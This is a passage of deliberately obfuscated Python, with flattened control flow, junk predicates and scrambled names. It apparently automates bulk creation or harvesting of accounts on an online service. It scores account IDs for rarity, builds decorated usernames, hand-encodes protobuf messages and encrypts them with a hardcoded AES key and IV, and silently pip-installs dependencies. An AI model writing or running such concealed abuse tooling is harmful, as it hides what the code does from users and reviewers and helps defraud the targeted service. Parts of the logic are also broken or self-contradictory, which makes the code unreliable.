                        lIlIlIlIllllIlIlllIIlll = min(12, len(lIIIllIIlllIllIll))
                        llIIlIllIIllIIlllllI = 5510291
                        continue
                    if llIIlIllIIllIIlllllI == 9773826:
                        llIIlIllIIllIIlllllI = 1353499
                        continue
                    if llIIlIllIIllIIlllllI == 9320695:
                        getattr(llllllIllllIIIl, 'append')(f'ALL_SAME+{lIlIlIlIllllIlIlllIIlll}')
                        break
            llIIIlIIlIIIlllllIlIlIII = 7484360
            continue
        if llIIIlIIlIIIlllllIlIlIII == 9151877:
            llIIIlIIlIIIlllllIlIlIII = 9084639
            continue
        if llIIIlIIlIIIlllllIlIlIII == 6839254:
            if len(lIIIllIIlllIllIll) >= 4:
                for i in range(len(lIIIllIIlllIllIll) - 3):
                    if lIIIllIIlllIllIll[i] == lIIIllIIlllIllIll[i + 1] == lIIIllIIlllIllIll[i + 2] == lIIIllIIlllIllIll[i + 3]:
                        lIlIlIlIllllIlIlllIIlll = 10
                        score += lIlIlIlIllllIlIlllIIlll
                        getattr(llllllIllllIIIl, 'append')(f'QUAD_IDENTICAL+{lIlIlIlIllllIlIlllIIlll}')
                        break
            llIIIlIIlIIIlllllIlIlIII = 2831654
            continue
        if llIIIlIIlIIIlllllIlIlIII == 5699952:
            llllllIllllIIIl = []
            llIIIlIIlIIIlllllIlIlIII = 9807929
            continue
        if llIIIlIIlIIIlllllIlIlIII == 6228959:
            if len(account_id) <= 6 and getattr(account_id, 'isdigit')() and (int(account_id) < 10000):
                score += 10
                getattr(llllllIllllIIIl, 'append')('ULTRA_LOW_ID+10')
            elif len(account_id) <= 8 and getattr(account_id, 'isdigit')() and (int(account_id) < 100000):
                score += 7
                getattr(llllllIllllIIIl, 'append')('LOW_ID+7')
            elif len(account_id) <= 10 and getattr(account_id, 'isdigit')() and (int(account_id) < 1000000):
                score += 4
                getattr(llllllIllllIIIl, 'append')('MID_ID+4')
            llIIIlIIlIIIlllllIlIlIII = 8615939
            continue
        if llIIIlIIlIIIlllllIlIlIII == 9807929:
            for IIlIllIlllIlIlIIl, (llIlIIIIIllllIIl, lIIIlllIlIIllIllIl) in getattr(lIlIlIlllIllIIIlIll, 'items')():
                if getattr(IlIllIIllIllIlIllIIIllI, 'search')(llIlIIIIIllllIIl, account_id):
                    score += lIIIlllIlIIllIllIl
                    getattr(llllllIllllIIIl, 'append')(f'{IIlIllIlllIlIlIIl}+{lIIIlllIlIIllIllIl}')
            llIIIlIIlIIIlllllIlIlIII = 2759140
            continue
        if llIIIlIIlIIIlllllIlIlIII == 2759140:
            lIIIllIIlllIllIll = [int(d) for d in account_id if getattr(d, 'isdigit')()]
            llIIIlIIlIIIlllllIlIlIII = 6839254
            continue
        if llIIIlIIlIIIlllllIlIlIII == 7891919:
            if account_id == 'N/A' or not account_id:
                return (False, None, None, 0)
            llIIIlIIlIIIlllllIlIlIII = 4579946
            continue

def IIlIIlIlllIlllllIll():
    llIIIlIIIIlllIIIllI = 8359421
    while True:
        if llIIIlIIIIlllIIIllI == 2945995:
            return True
            break
        if llIIIlIIIIlllIIIllI == 4628544:
            llIIIlIIIIlllIIIllI = 2945995
            continue
        if llIIIlIIIIlllIIIllI == 8167160:
            llIIIlIIIIlllIIIllI = 4628544
            continue
        if llIIIlIIIIlllIIIllI == 8359421:
            llIIIlIIIIlllIIIllI = 4176963
            continue
        if llIIIlIIIIlllIIIllI == 4176963:
            lIIlIllIlIIIIIIllII = ['requests', 'pycryptodome', 'colorama', 'urllib3']
            llIIIlIIIIlllIIIllI = 9012407
            continue
        if llIIIlIIIIlllIIIllI == 9012407:
            for llIIlIllIIIIlIIIIIlI in lIIlIllIlIIIIIIllII:
                try:
                    if llIIlIllIIIIlIIIIIlI == 'pycryptodome':
                        IIIllllIlIIIIIIlIlI = getattr(__import__('importlib'), 'import_module')('Crypto')
                    else:
                        getattr(IlIlIllIIlIIlllI, 'import_module')(llIIlIllIIIIlIIIIIlI)
                except ImportError:
                    try:
                        getattr(IlIIIllllIlllIllIlIIIl, 'check_call')([getattr(lIIIlIIlIIlllIIIlIII, 'executable'), '-m', 'pip', 'install', llIIlIllIIIIlIIIIIlI, '--quiet'])
                    except:
                        return False
            llIIIlIIIIlllIIIllI = 2945995
            continue

def IlIIlIlIlIIIIllIllIIll(signum=None, frame=None):
    global IlIIIlllllIIlllII
    lllIlllllIlIlIlIIl = 7071487
    while True:
        if lllIlllllIlIlIlIIl == 8896374:
            lllIlllllIlIlIlIIl = 5041768
            continue
        if lllIlllllIlIlIlIIl == 3759525:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            lllIlllllIlIlIlIIl = 5041768
            continue
        if lllIlllllIlIlIlIIl == 6082650:
            lllIlllllIlIlIlIIl = 3443259
            continue
        if lllIlllllIlIlIlIIl == 7071487:
            lllIlllllIlIlIlIIl = 9913898
            continue
        if lllIlllllIlIlIlIIl == 2044669:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'RED1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lllIlllllIlIlIlIIl = 2827730
            continue
        if lllIlllllIlIlIlIIl == 3085360:
            lllIlllllIlIlIlIIl = 6082650
            continue
        if lllIlllllIlIlIlIIl == 9913898:
            IlIIIlllllIIlllII = True
            lllIlllllIlIlIlIIl = 9125327
            continue
        if lllIlllllIlIlIlIIl == 3831495:
            getattr(lIlIlIIllllllllllIlII, 'stop')()
            lllIlllllIlIlIlIIl = 9786256
            continue
        if lllIlllllIlIlIlIIl == 9125327:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏳ Saving remaining data...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lllIlllllIlIlIlIIl = 3831495
            continue
        if lllIlllllIlIlIlIIl == 2827730:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}⛔ SYSTEM SHUTDOWN ⛔{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'RED1')}')
            lllIlllllIlIlIlIIl = 3759525
            continue
        if lllIlllllIlIlIlIIl == 9786256:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏳ Flushing save queue...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lllIlllllIlIlIlIIl = 5838939
            continue
        if lllIlllllIlIlIlIIl == 5041768:
            getattr(lIIIlIIlIIlllIIIlIII, 'exit')(0)
            break
        if lllIlllllIlIlIlIIl == 5838939:
            getattr(lIIlIIIIlIllII, 'stop')()
            lllIlllllIlIlIlIIl = 3443259
            continue
        if lllIlllllIlIlIlIIl == 3443259:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}✓ All data saved!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lllIlllllIlIlIlIIl = 2044669
            continue
getattr(IlIlIIIllllIIl, 'signal')(getattr(IlIlIIIllllIIl, 'SIGINT'), IlIIlIlIlIIIIllIllIIll)
getattr(IlIlIIIllllIIl, 'signal')(getattr(IlIlIIIllllIIl, 'SIGTERM'), IlIIlIlIlIIIIllIllIIll)

def IlIllIlIIIllIIIlI():
    IllIllllIIIIIl = 1730121
    while True:
        if IllIllllIIIIIl == 9384698:
            return getattr('', 'join')((IIlIIlIIIIllIlll[d] for d in f'{lIIlIlIIlllIlIIIIlIIIll:04d}'))
            break
        if IllIllllIIIIIl == 8284746:
            IllIllllIIIIIl = 2911689
            continue
        if IllIllllIIIIIl == 7400892:
            IIlIIlIIIIllIlll = {'0': '⁰', '1': '¹', '2': '²', '3': '³', '4': '⁴', '5': '⁵', '6': '⁶', '7': '⁷', '8': '⁸', '9': '⁹'}
            IllIllllIIIIIl = 6337707
            continue
        if IllIllllIIIIIl == 6337707:
            lIIlIlIIlllIlIIIIlIIIll = getattr(IIIllllllIlIlIllIIIIl, 'randint')(1, 9999)
            IllIllllIIIIIl = 9384698
            continue
        if IllIllllIIIIIl == 2787583:
            IllIllllIIIIIl = 8284746
            continue
        if IllIllllIIIIIl == 1730121:
            if 588 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][24] == 766:
                lIIIlllIlIIIlI = 3732786
                while True:
                    if lIIIlllIlIIIlI == 5833499:
                        lIIIlllIlIIIlI = 7529116
                        continue
                    if lIIIlllIlIIIlI == 2496495:
                        IllllIIIIlllIlIIlllIl = sum(lIIIIlIIlIlIlIlIIll) + lllIIlllIIIlIlIIlIlI % 50 - lIlIlIllIlllIlIIIIIlIIII
                        break
                    if lIIIlllIlIIIlI == 1048079:
                        lllIIlllIIIlIlIIlIlI = (lIlIlIllIlllIlIIIIIlIIII * 5 ^ 13263962) & 4294967295
                        lIIIlllIlIIIlI = 7529116
                        continue
                    if lIIIlllIlIIIlI == 3732786:
                        lIlIlIllIlllIlIIIIIlIIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][14] * 511286 + 21
                        lIIIlllIlIIIlI = 1048079
                        continue
                    if lIIIlllIlIIIlI == 7529116:
                        lIIIIlIIlIlIlIlIIll = [lllIIlllIIIlIlIIlIlI >> 7 & 255 for lllllIIlIIIIIIIlI in range(5)]
                        lIIIlllIlIIIlI = 2496495
                        continue
            IllIllllIIIIIl = 7400892
            continue
        if IllIllllIIIIIl == 2911689:
            IllIllllIIIIIl = 6337707
            continue

def IllIlIlIlllIII(base):
    if getattr(IIIllllllIlIlIllIIIIl, 'random')() < 0.7:
        IllllIllIlIIlIllIIII = 5661865
        while True:
            if IllllIllIlIIlIllIIII == 8056147:
                IIlllIIIllIlllIIIIllll = getattr(IIIllllllIlIlIllIIIIl, 'choice')(['front', 'back', 'both', 'middle'])
                IllllIllIlIIlIllIIII = 9585384
                continue
            if IllllIllIlIIlIllIIII == 9585384:
                if IIlllIIIllIlllIIIIllll == 'front':
                    return f'{llIlIlIIIlIIIl}{base}{IlIllIlIIIllIIIlI()}'
                elif IIlllIIIllIlllIIIIllll == 'back':
                    return f'{base}{IlIllIlIIIllIIIlI()}{llIlIlIIIlIIIl}'
                elif IIlllIIIllIlllIIIIllll == 'both':
                    IlIlllllIlllIlIIlIlllIIl = get_fast_ip(getattr(IIIllllllIlIlIllIIIIl, 'randint')(1, 2))
                    return f'{llIlIlIIIlIIIl}{base}{IlIllIlIIIllIIIlI()}{IlIlllllIlllIlIIlIlllIIl}'
                else:
                    IIIIlllIlllIll = len(base) // 2
                    return f'{base[:IIIIlllIlllIll]}{llIlIlIIIlIIIl}{base[IIIIlllIlllIll:]}{IlIllIlIIIllIIIlI()}'
                break
            if IllllIllIlIIlIllIIII == 2818922:
                llIlIlIIIlIIIl = get_fast_ip(IlIllIIIIlllllIlIIIIlIl)
                IllllIllIlIIlIllIIII = 8056147
                continue
            if IllllIllIlIIlIllIIII == 5661865:
                IlIllIIIIlllllIlIIIIlIl = getattr(IIIllllllIlIlIllIIIIl, 'randint')(1, 3)
                IllllIllIlIIlIllIIII = 2818922
                continue
            if IllllIllIlIIlIllIIII == 5673307:
                IllllIllIlIIlIllIIII = 9585384
                continue
    else:
        return f'{base}{IlIllIlIIIllIIIlI()}'

def IllIIllIIIllIl(user_prefix):
    llIlIIIlIlIIIlIllIlllIlI = 5965121
    while True:
        if llIlIIIlIlIIIlIllIlllIlI == 2216202:
            llIlIIIlIlIIIlIllIlllIlI = 8574950
            continue
        if llIlIIIlIlIIIlIllIlllIlI == 5965121:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][24] * 50 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][24] == 8677:
                IIIlIIIllIIlIIllIl = 5460927
                while True:
                    if IIIlIIIllIIlIIllIl == 9899507:
                        IIIlIIIllIIlIIllIl = 5460927
                        continue
                    if IIIlIIIllIIlIIllIl == 8560468:
                        IIIlIIIllIIlIIllIl = 9899507
                        continue
                    if IIIlIIIllIIlIIllIl == 7287323:
                        lIllIIllIIIlIIlIllIlIl = [IIIIlIIIllIlIlIIIIlllI >> 6 & 255 for llIllllIIIlIlIIII in range(3)]
                        IIIlIIIllIIlIIllIl = 7306453
                        continue
                    if IIIlIIIllIIlIIllIl == 3205728:
                        IIIIlIIIllIlIlIIIIlllI = (llIllIIIIlIIllll * 3 ^ 4414413) & 4294967295
                        IIIlIIIllIIlIIllIl = 7287323
                        continue
                    if IIIlIIIllIIlIIllIl == 7303393:
                        IIIlIIIllIIlIIllIl = 5460927
                        continue
                    if IIIlIIIllIIlIIllIl == 5460927:
                        llIllIIIIlIIllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] * 188173 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][7]
                        IIIlIIIllIIlIIllIl = 3205728
                        continue
                    if IIIlIIIllIIlIIllIl == 7306453:
                        lllllIIIllIlIlIl = sum(lIllIIllIIIlIIlIllIlIl) + IIIIlIIIllIlIlIIIIlllI % 44 - llIllIIIIlIIllll
                        break
            llIlIIIlIlIIIlIllIlllIlI = 8303245
            continue
        if llIlIIIlIlIIIlIllIlllIlI == 5992361:
            return f'{user_prefix}{lIIlIlIIIlIllIlIIIIlIIII}{IlIIlIlIlllIIIIIlllIlII}'
            break
        if llIlIIIlIlIIIlIllIlllIlI == 8303245:
            IlIIlIlIlllIIIIIlllIlII = getattr('', 'join')((getattr(IIIllllllIlIlIllIIIIl, 'choice')(getattr(lIIIIllIIIIIllIlIllIIl, 'ascii_uppercase') + getattr(lIIIIllIIIIIllIlIllIIl, 'digits') + getattr(lIIIIllIIIIIllIlIllIIl, 'ascii_lowercase')) for _ in range(8)))
            llIlIIIlIlIIIlIllIlllIlI = 5992361
            continue
        if llIlIIIlIlIIIlIllIlllIlI == 8574950:
            llIlIIIlIlIIIlIllIlllIlI = 5992361
            continue
        if llIlIIIlIlIIIlIllIlllIlI == 1585082:
            llIlIIIlIlIIIlIllIlllIlI = 5992361
            continue

def lIIlIlllIIIlIIIIIlI(n):
    IIllIIIlIIIlllIlIllI = 6188084
    while True:
        if IIllIIIlIIIlllIlIllI == 2093338:
            if n < 0:
                return b''
            IIllIIIlIIIlllIlIllI = 9969653
            continue
        if IIllIIIlIIIlllIlIllI == 8632886:
            IIllIIIlIIIlllIlIllI = 5470671
            continue
        if IIllIIIlIIIlllIlIllI == 5470671:
            IIllIIIlIIIlllIlIllI = 1297060
            continue
        if IIllIIIlIIIlllIlIllI == 6188084:
            IIllIIIlIIIlllIlIllI = 2093338
            continue
        if IIllIIIlIIIlllIlIllI == 1297060:
            IIllIIIlIIIlllIlIllI = 2093338
            continue
        if IIllIIIlIIIlllIlIllI == 5597655:
            while True:
                llIllIlIllllllIl = n & 127
                n >>= 7
                if n:
                    llIllIlIllllllIl |= 128
                getattr(lIllIIllIllIllIIIIIlllII, 'append')(llIllIlIllllllIl)
                if not n:
                    break
            IIllIIIlIIIlllIlIllI = 2829221
            continue
        if IIllIIIlIIIlllIlIllI == 9969653:
            lIllIIllIllIllIIIIIlllII = []
            IIllIIIlIIIlllIlIllI = 5597655
            continue
        if IIllIIIlIIIlllIlIllI == 2829221:
            return bytes(lIllIIllIllIllIIIIIlllII)
            break

def llIlIllIIIIIIllllIlIIl(field_num, value):
    IIIIIlllIIlIlI = 7283743
    while True:
        if IIIIIlllIIlIlI == 5798080:
            if isinstance(value, dict):
                lllIlllIllIIllI = 9005906
                while True:
                    if lllIlllIllIIllI == 2921639:
                        lIlIllIIlIlIllIlIIII = field_num << 3 | 2
                        lllIlllIllIIllI = 3110658
                        continue
                    if lllIlllIllIIllI == 6108281:
                        lllIlllIllIIllI = 2921639
                        continue
                    if lllIlllIllIIllI == 9005906:
                        lllIIllIIIlIIlllIllIIIll = llIlIllIIIIIIllllIlIIl(field_num, value)
                        lllIlllIllIIllI = 2921639
                        continue
                    if lllIlllIllIIllI == 3110658:
                        return lIIlIlllIIIlIIIIIlI(lIlIllIIlIlIllIlIIII) + lIIlIlllIIIlIIIIIlI(len(lllIIllIIIlIIlllIllIIIll)) + lllIIllIIIlIIlllIllIIIll
                        break
                    if lllIlllIllIIllI == 2763727:
                        lllIlllIllIIllI = 3110658
                        continue
            elif isinstance(value, int):
                lIlIllIIlIlIllIlIIII = field_num << 3 | 0
                return lIIlIlllIIIlIIIIIlI(lIlIllIIlIlIllIlIIII) + lIIlIlllIIIlIIIIIlI(value)
            elif isinstance(value, (str, bytes)):
                IIllIllIlIIIIlIlllIlI = 9221165
                while True:
                    if IIllIllIlIIIIlIlllIlI == 9363002:
                        lIlIllIIlIlIllIlIIII = field_num << 3 | 2
                        IIllIllIlIIIIlIlllIlI = 2487149
                        continue
                    if IIllIllIlIIIIlIlllIlI == 2487149:
                        return lIIlIlllIIIlIIIIIlI(lIlIllIIlIlIllIlIIII) + lIIlIlllIIIlIIIIIlI(len(IIIIllllllIIllIlIlI)) + IIIIllllllIIllIlIlI
                        break
                    if IIllIllIlIIIIlIlllIlI == 4388739:
                        IIllIllIlIIIIlIlllIlI = 4388739
                        continue
                    if IIllIllIlIIIIlIlllIlI == 9221165:
                        IIIIllllllIIllIlIlI = getattr(value, 'encode')() if isinstance(value, str) else value
                        IIllIllIlIIIIlIlllIlI = 9363002
                        continue
                    if IIllIllIlIIIIlIlllIlI == 7310114:
                        IIllIllIlIIIIlIlllIlI = 9221165
                        continue
                    if IIllIllIlIIIIlIlllIlI == 1352745:
                        IIllIllIlIIIIlIlllIlI = 9221165
                        continue
            IIIIIlllIIlIlI = 4561929
            continue
        if IIIIIlllIIlIlI == 7283743:
            IIIIIlllIIlIlI = 5798080
            continue
        if IIIIIlllIIlIlI == 4561929:
            return b''
            break
        if IIIIIlllIIlIlI == 3182027:
            IIIIIlllIIlIlI = 5798080
            continue
        if IIIIIlllIIlIlI == 1835282:
            IIIIIlllIIlIlI = 1835282
            continue
        if IIIIIlllIIlIlI == 1309985:
            IIIIIlllIIlIlI = 7283743
            continue

def load_saved_data(fields):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][16] ^ 183 == 333:
        IIIIIIIllIIIIlIlIlIlIlI = 2300687
        while True:
            if IIIIIIIllIIIIlIlIlIlIlI == 2346278:
                IIllIlIlIIlIIlIllIllIlI = [llllIIlIllIlIIllIlI >> 3 & 255 for llIllIllIIlllllIlIllIIIl in range(5)]
                IIIIIIIllIIIIlIlIlIlIlI = 2005323
                continue
            if IIIIIIIllIIIIlIlIlIlIlI == 2205637:
                IIIIIIIllIIIIlIlIlIlIlI = 2205637
                continue
            if IIIIIIIllIIIIlIlIlIlIlI == 2005323:
                IIlIllllIIllIlIIlIllI = sum(IIllIlIlIIlIIlIllIllIlI) + llllIIlIllIlIIllIlI % 28 - lIllIIIIIlllIlIllIIll
                break
            if IIIIIIIllIIIIlIlIlIlIlI == 6183955:
                llllIIlIllIlIIllIlI = (lIllIIIIIlllIlIllIIll * 5 ^ 3083145) & 65535
                IIIIIIIllIIIIlIlIlIlIlI = 2346278
                continue
            if IIIIIIIllIIIIlIlIlIlIlI == 2300687:
                lIllIIIIIlllIlIllIIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][21] * 503792 + 21
                IIIIIIIllIIIIlIlIlIlIlI = 6183955
                continue
    return getattr(b'', 'join')((llIlIllIIIIIIllllIlIIl(k, v) for k, v in getattr(fields, 'items')()))

def encrypt_payload(hex_data):
    lIIIlIIlIIIlIIlIIlIIl = 9673825
    while True:
        if lIIIlIIlIIIlIIlIIlIIl == 8678242:
            return getattr(IIlIIIIIIllIlllIlIIII, 'encrypt')(IIllIIIIlIlIIlIllI(data, getattr(IIIIIIIllIIlIIllIIIll, 'block_size')))
            break
        if lIIIlIIlIIIlIIlIIlIIl == 2163749:
            data = getattr(bytes, 'fromhex')(hex_data)
            lIIIlIIlIIIlIIlIIlIIl = 1593513
            continue
        if lIIIlIIlIIIlIIlIIlIIl == 8841073:
            IIlIlIlllIIllllIII = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
            lIIIlIIlIIIlIIlIIlIIl = 2801023
            continue
        if lIIIlIIlIIIlIIlIIlIIl == 9673825:
            lIIIlIIlIIIlIIlIIlIIl = 2163749
            continue
        if lIIIlIIlIIIlIIlIIlIIl == 7926825:
            lIIIlIIlIIIlIIlIIlIIl = 8678242
            continue
        if lIIIlIIlIIIlIIlIIlIIl == 2801023:
            IIlIIIIIIllIlllIlIIII = getattr(IIIIIIIllIIlIIllIIIll, 'new')(lIIIlIlllIIIlI, getattr(IIIIIIIllIIlIIllIIIll, 'MODE_CBC'), IIlIlIlllIIllllIII)
            lIIIlIIlIIIlIIlIIlIIl = 8678242
            continue
        if lIIIlIIlIIIlIIlIIlIIl == 8877029:
            lIIIlIIlIIIlIIlIIlIIl = 8841073
            continue
        if lIIIlIIlIIIlIIlIIlIIl == 1593513:
            lIIIlIlllIIIlI = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
            lIIIlIIlIIIlIIlIIlIIl = 8841073
            continue

def encrypt_hex_payload(plain_hex):
    IlIIIIIlIIlllIlIlIIllIl = 6238339
    while True:
        if IlIIIIIlIIlllIlIlIIllIl == 6238339:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] ^ 32 == 381:
                lIllIllIIlIIIIIlIl = 5254539
                while True:
                    if lIllIllIIlIIIIIlIl == 3739867:
                        lIllIllIIlIIIIIlIl = 4190635
                        continue
                    if lIllIllIIlIIIIIlIl == 7456876:
                        IIIllllIlIIIlllIIIII = [IllllIIllllIll >> 4 & 255 for llIlIIlIIIIllI in range(3)]
                        lIllIllIIlIIIIIlIl = 4533311
                        continue
                    if lIllIllIIlIIIIIlIl == 9698922:
                        lIllIllIIlIIIIIlIl = 7456876
                        continue
                    if lIllIllIIlIIIIIlIl == 5254539:
                        IIlIIIIIIIlIIllIllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][27] * 337078 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][30]
                        lIllIllIIlIIIIIlIl = 4190635
                        continue
                    if lIllIllIIlIIIIIlIl == 4533311:
                        lllIllIlllIlllllI = sum(IIIllllIlIIIlllIIIII) + IllllIIllllIll % 68 - IIlIIIIIIIlIIllIllll
                        break
                    if lIllIllIIlIIIIIlIl == 4190635:
                        IllllIIllllIll = (IIlIIIIIIIlIIllIllll * 3 ^ 11202212) & 65535
                        lIllIllIIlIIIIIlIl = 7456876
                        continue
            IlIIIIIlIIlllIlIlIIllIl = 3023846
            continue
        if IlIIIIIlIIlllIlIlIIllIl == 3151675:
            IlIIlIlllIlllllllIl = getattr(IIIIIIIllIIlIIllIIIll, 'new')(IIlIIIIIIlIIIIll, getattr(IIIIIIIllIIlIIllIIIll, 'MODE_CBC'), IIllIllllIllIIIIIllll)
            IlIIIIIlIIlllIlIlIIllIl = 4515996
            continue
        if IlIIIIIlIIlllIlIlIIllIl == 4746298:
            IlIIIIIlIIlllIlIlIIllIl = 8656559
            continue
        if IlIIIIIlIIlllIlIlIIllIl == 3023846:
            plain = getattr(bytes, 'fromhex')(plain_hex)
            IlIIIIIlIIlllIlIlIIllIl = 8656559
            continue
        if IlIIIIIlIIlllIlIlIIllIl == 7362708:
            IIllIllllIllIIIIIllll = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
            IlIIIIIlIIlllIlIlIIllIl = 3151675
            continue
        if IlIIIIIlIIlllIlIlIIllIl == 4515996:
            return getattr(getattr(IlIIlIlllIlllllllIl, 'encrypt')(IIllIIIIlIlIIlIllI(plain, getattr(IIIIIIIllIIlIIllIIIll, 'block_size'))), 'hex')()
            break
        if IlIIIIIlIIlllIlIlIIllIl == 8656559:
            IIlIIIIIIlIIIIll = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
            IlIIIIIlIIlllIlIlIIllIl = 7362708
            continue
        if IlIIIIIlIIlllIlIlIIllIl == 9221430:
            IlIIIIIlIIlllIlIlIIllIl = 3151675
            continue

def IlIllIlIIIllIIIlI():
    lIIIlIllIlllIlIlIlIIlII = 9903424
    while True:
        if lIIIlIllIlllIlIlIlIIlII == 8340235:
            lIIIlIllIlllIlIlIlIIlII = 8340235
            continue
        if lIIIlIllIlllIlIlIlIIlII == 5968771:
            IlllllllllIIIlllIl = {'0': '⁰', '1': '¹', '2': '²', '3': '³', '4': '⁴', '5': '⁵', '6': '⁶', '7': '⁷', '8': '⁸', '9': '⁹'}
            lIIIlIllIlllIlIlIlIIlII = 6460991
            continue
        if lIIIlIllIlllIlIlIlIIlII == 6460991:
            lllllIIlIIIIIllIlIIlll = getattr(IIIllllllIlIlIllIIIIl, 'randint')(1, 9999)
            lIIIlIllIlllIlIlIlIIlII = 6054290
            continue
        if lIIIlIllIlllIlIlIlIIlII == 6054290:
            return getattr('', 'join')((IlllllllllIIIlllIl[d] for d in f'{lllllIIlIIIIIllIlIIlll:04d}'))
            break
        if lIIIlIllIlllIlIlIlIIlII == 9903424:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][27] * 92 + 250 == 2664:
                lIIllIIIIIllIIIll = 7145308
                while True:
                    if lIIllIIIIIllIIIll == 4964993:
                        lIIllIIIIIllIIIll = 2180635
                        continue
                    if lIIllIIIIIllIIIll == 3894843:
                        IIIlIlIIIlIIlllIlllIlIlI = (IIllIIllIIIIIIlI * 5 ^ 7889737) & 4294967295
                        lIIllIIIIIllIIIll = 2180635
                        continue
                    if lIIllIIIIIllIIIll == 2180635:
                        IllIllllIlIIIlllIlIlI = [IIIlIlIIIlIIlllIlllIlIlI >> 3 & 255 for llIlIlIllIIIIIllll in range(5)]
                        lIIllIIIIIllIIIll = 6509910
                        continue
                    if lIIllIIIIIllIIIll == 8554535:
                        lIIllIIIIIllIIIll = 8554535
                        continue
                    if lIIllIIIIIllIIIll == 6509910:
                        IllIllIlIIIIlllI = sum(IllIllllIlIIIlllIlIlI) + IIIlIlIIIlIIlllIlllIlIlI % 7 - IIllIIllIIIIIIlI
                        break
                    if lIIllIIIIIllIIIll == 7145308:
                        IIllIIllIIIIIIlI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] * 84905 + 218
                        lIIllIIIIIllIIIll = 3894843
                        continue
            lIIIlIllIlllIlIlIlIIlII = 5968771
            continue
        if lIIIlIllIlllIlIlIlIIlII == 1644282:
            lIIIlIllIlllIlIlIlIIlII = 6460991
            continue
IIIllllIIIlIlllIIIlllIIl = [('꧁', '꧂'), ('『', '』'), ('【', '】'), ('《', '》'), ('〈', '〉'), ('〔', '〕'), ('〖', '〗'), ('〘', '〙'), ('〚', '〛'), ('❬', '❭'), ('❮', '❯'), ('⦅', '⦆'), ('⟦', '⟧'), ('⟨', '⟩'), ('⫷', '⫸')]
IllIlllllIIlllllIlIIll = ['☆', '★', '✧', '✦', '✩', '✪', '✫', '✬', '✭', '✮', '✯', '✰', '♡', '♥', '❤', '❥', '❦', '❧', 'ゝ', '々', '〆', '⁂', '※', '⁑']

def IllIlIlIlllIII(base):
    IIlIllIlIlllIIIlIll = 5391989
    while True:
        if IIlIllIlIlllIIIlIll == 8930930:
            IIlIllIlIlllIIIlIll = 3352562
            continue
        if IIlIllIlIlllIIIlIll == 3279059:
            lIIIllIlIllIlllIIlIl = getattr(IIIllllllIlIlIllIIIIl, 'random')()
            IIlIllIlIlllIIIlIll = 3352562
            continue
        if IIlIllIlIlllIIIlIll == 5715630:
            llIIlIIIlIIlIlIIIlll = IlIllIlIIIllIIIlI()
            IIlIllIlIlllIIIlIll = 3279059
            continue
        if IIlIllIlIlllIIIlIll == 3352562:
            if lIIIllIlIllIlllIIlIl < 0.4:
                IlIlIIIlIllIIllllllI, IIlIllIlIlIllIllIIIIll = getattr(IIIllllllIlIlIllIIIIl, 'choice')(IIIllllIIIlIlllIIIlllIIl)
